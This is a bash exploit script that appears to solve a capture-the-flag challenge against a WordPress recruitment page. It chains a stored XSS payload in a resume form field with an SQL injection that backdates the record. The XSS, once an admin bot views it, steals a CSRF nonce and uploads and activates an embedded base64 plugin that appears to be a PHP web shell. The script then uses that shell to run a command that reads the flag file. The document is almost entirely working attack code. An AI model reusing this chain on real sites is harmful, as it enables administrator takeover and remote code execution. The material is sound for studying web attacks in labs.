#!/bin/bash

# download a dummy PDF
wget https://mag.wcoomd.org/uploads/2018/05/blank.pdf -O blank.pdf

# sends a resume and parses the response to get the application ID
resume_id=$(
    curl -s http://beyond-ai.ecw/?ai-recruitment -F 'email=opencyber@opencyber.com' \
    -F 'fullname=opencyber' -F 'resume=@blank.pdf' | grep -Eo 'application=[0-9]+' | grep -Eo '[0-9]+')

# modify the resume to make it trigger an XSS that is going to upload a RCE plugin
# the payload also makes sure the date of the upload is on 2023-01-01 (so before the 1st of July 2023)
# using an SQLi in an update statement
# details of the payload can be found in README.md
curl "http://beyond-ai.ecw/?ai-recruitment&application=$resume_id" --data-raw 'email=opencyber%40opencyber.com&fullname=%22%3E%3Cscript%3E+fetch%28%22%2Fwp-admin%2Fplugin-install.php%22%29+.then%28resp+%3D%3E+resp.text%28%29%29+.then%28htmlResponse+%3D%3E+%7B+%09const+htmlDoc+%3D+new+DOMParser%28%29.parseFromString%28htmlResponse%2C+%22text%2Fhtml%22%29%3B+%09const+csrfToken+%3D+htmlDoc.getElementsByClassName%28%22wp-upload-form%22%29%5B0%5D.getElementsByTagName%28%22input%22%29%5B0%5D.value%3B+%09const+b64_plugin_data+%3D+%22UEsDBBQAAAAIAGdanFYSKsI7lwEAAHMDAAAJABwAaW5kZXgucGhwVVQJAAOSj0tkwY9LZHV4CwABBOkDAAAE6QMAAJ1Sy27bMBA8V1%2BxEHqwHUt0nSKHNEBfMdwAQeI6j0sRCGuKkYRYJEFSkY2g%2F16SkmIZyaEwT4udnZnVjs6%2BylwGZDQKYATLnzNADQg3TD0XlIFtuv43ifQJMwYAirIIdYSRbkY8jJXJhbIobJDndlb79triXDvWfHEZTePJUdvmT%2BBfbozUp4RkhcmrVUxFSToBUguVSsW0jpylXFdZwT2dCrlVRZYbmE6mx%2BO%2Bpcd3xB1p4Su4wpKdNtZvvrU3dre86KYOWvGcaaoKaQrBO53rlUGrjNz72oo9M7WFVwWQ9ryxI98zpXtE9z7Fk3jisO%2F%2Bzn1o7%2BAN%2FL%2FrO8Yt2xg4F6XdraO8F%2FBlE2TfuJ9oC%2FeNna%2B1res6zngVC5WR9m%2FQJJNrR43NxvhreXtYoMk7Nlkjzyp7Eb%2FkvDC%2FqtVeOIek0sr8UMhp6%2BSMLUSCANM0QeoSG4S1TB6FMEyFYwibKrFS4fBLEDxW3E%2FBrj8YwkvwQW%2B1YeVghZqdfE5SRkXKBh%2BT5ez33ezm9k9IyzR8GFqJv8E%2FUEsBAh4DFAAAAAgAZ1qcVhIqwjuXAQAAcwMAAAkAGAAAAAAAAQAAAKSBAAAAAGluZGV4LnBocFVUBQADko9LZHV4CwABBOkDAAAE6QMAAFBLBQYAAAAAAQABAE8AAADaAQAAAAA%3D%22%3B+%09fetch%28%22data%3Aapplication%2Fzip%3Bbase64%2C%22+%2B+b64_plugin_data%29+%09.then%28res+%3D%3E+res.blob%28%29%29+%09.then%28pluginBlob+%3D%3E+%7B+%09%09const+formData+%3D+new+FormData%28%29%3B+%09%09formData.append%28%22_wpnonce%22%2C+csrfToken%29%3B+%09%09formData.append%28%22_wp_http_referer%22%2C+%22%2Fwp-admin%2Fplugin-install.php%22%29%3B+%09%09formData.append%28%22pluginzip%22%2C+pluginBlob%2C+%22plugin.zip%22%29%3B+%09%09formData.append%28%22install-plugin-submit%22%2C+%22Install+Now%22%29%3B+%09%09fetch%28%22%2Fwp-admin%2Fupdate.php%3Faction%3Dupload-plugin%22%2C+%7B+%09%09%09%22method%22%3A+%22POST%22%2C+%09%09%09%22body%22%3A+formData+%09%09%7D%29+%09%09.then%28resp+%3D%3E+resp.text%28%29%29+%09%09.then%28htmlResponse+%3D%3E+%7B+%09%09%09const+htmlDoc2+%3D+new+DOMParser%28%29.parseFromString%28htmlResponse%2C+%22text%2Fhtml%22%29%3B+%09%09%09const+link+%3D+htmlDoc2.getElementsByClassName%28%22button+button-primary%22%29%5B0%5D.getAttribute%28%22href%22%29%3B+%09%09%09fetch%28%22%2Fwp-admin%2F%22+%2B+link%29%3B+%09%09%7D%29%3B+%09%7D%29%3B+%7D%29%3B+%3C%2Fscript%3E+%27%2Cdate%3D%272023-05-11'

# wait for the bot to execute our payload
sleep 130

# use the uploaded plugin to execute : "cat /flag.txt"
curl -s 'http://beyond-ai.ecw/?cmd=Y2F0IC9mbGFnLnR4dAo=' | grep -Eo 'ECW{.*}'

rm blank.pdf
